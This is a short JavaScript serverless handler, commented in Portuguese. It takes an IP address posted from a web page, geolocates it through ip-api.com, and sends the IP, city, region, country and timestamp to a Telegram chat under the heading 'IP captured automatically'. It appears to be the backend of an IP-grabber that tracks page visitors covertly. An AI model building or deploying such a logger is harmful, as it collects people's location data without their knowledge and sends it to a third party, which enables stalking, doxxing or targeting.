export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  const { ip } = req.body;

  try {
    // Busca info no ip-api.com via backend
    const infoRes = await fetch(`https://ip-api.com/json/${ip}`);
    const info = await infoRes.json();

    if (info.status !== 'success') {
      return res.status(400).json({ error: 'Não foi possível obter informações do IP' });
    }

    const { city: cidade, regionName: estado, country: pais } = info;

    const mensagem = `📡 IP capturado automaticamente:\n\n🌐 IP: ${ip}\n🏙️ Local aproximado: ${cidade} - ${estado} - ${pais}\n🕒 Hora: ${new Date().toLocaleString("pt-BR")}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: mensagem }),
    });

    const telegramData = await telegramRes.json();

    if (!telegramData.ok) {
      throw new Error(telegramData.description);
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    return res.status(500).json({ error: 'Erro ao processar solicitação', detalhe: error.message });
  }
}
